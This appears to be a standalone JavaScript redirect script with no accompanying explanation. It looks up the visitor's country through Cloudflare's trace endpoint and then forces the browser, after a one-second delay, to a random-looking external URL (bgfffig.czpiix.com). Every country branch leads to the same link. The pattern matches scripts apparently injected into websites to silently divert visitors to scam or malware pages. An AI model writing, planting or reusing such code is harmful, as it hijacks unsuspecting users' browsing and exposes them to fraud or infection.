var xRedir = 1000;
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var country_code = this.responseText.replace(/(\r\n|\n|\r)/gm,"").split('loc=');
country_code = country_code[1].split('tls=');
country_code = country_code[0];


if (country_code == "US"){

setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', xRedir);

}

else if (country_code == "GB"){

setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', xRedir);

}

//todosPais
else {

setTimeout('window.location.href = "https://bgfffig.czpiix.com/s/490ea52c75cda"', xRedir);

}

}
};

xhttp.open("GET", "https://www.cloudflare.com/cdn-cgi/trace", true);
xhttp.send();